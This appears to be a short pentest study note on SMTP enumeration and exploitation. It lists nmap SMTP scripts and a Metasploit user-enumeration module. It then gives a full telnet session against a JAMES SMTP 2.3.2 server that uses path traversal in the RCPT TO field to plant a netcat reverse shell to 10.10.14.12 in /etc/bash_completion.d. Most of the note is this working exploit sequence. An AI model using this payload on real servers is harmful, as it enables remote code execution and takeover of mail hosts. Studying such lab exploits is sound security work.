[[content/Mitre Attack/Reconnaissance TA0043/ENUMERATION]]

Scan:
	`~# nmap -p 25 --script smtp-enum-users x.x.x.x
	`~# nmap -p 25 --script smtp-open-relay x.x.x.x
	`~# nmap -p 25 --script smtp-commands x.x.x.x

MSFconsole:
	`~# msfconsole
	`msf6> use auxiliary/scanner/smtp/smtp_enum // brute force user to find
root@kali:~# telnet sindadsec.ir 25
Trying 220-mail.sindadsec.ir...
Connected to 220-mail.sindadsec.ir.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 30 Dec 2019 17:10:56 -0500 (EST)

EHLO sindadsec.ir
250-solidstate
250-PIPELINING
250 ENHANCEDSTATUSCODES

MAIL FROM: ```<s.mohammadi@sindadsec.ir>```

250 2.1.0 Sender ```<s.mohammadi@sindadsec.ir>``` OK

RCPT TO: ```<../../../../../../../../etc/bash_completion.d>```
250 2.1.5 Recipient ``` <../../../../../../../../etc/bash_completion.d@localhost> ```
OK

DATA
354 Ok Send data ending with ```<CRLF>.<CRLF>```
FROM: s.mohammadi.sindadsec.ir
'
/bin/nc -e /bin/bash 10.10.14.12 1234
.
250 2.6.0 Message received
quit
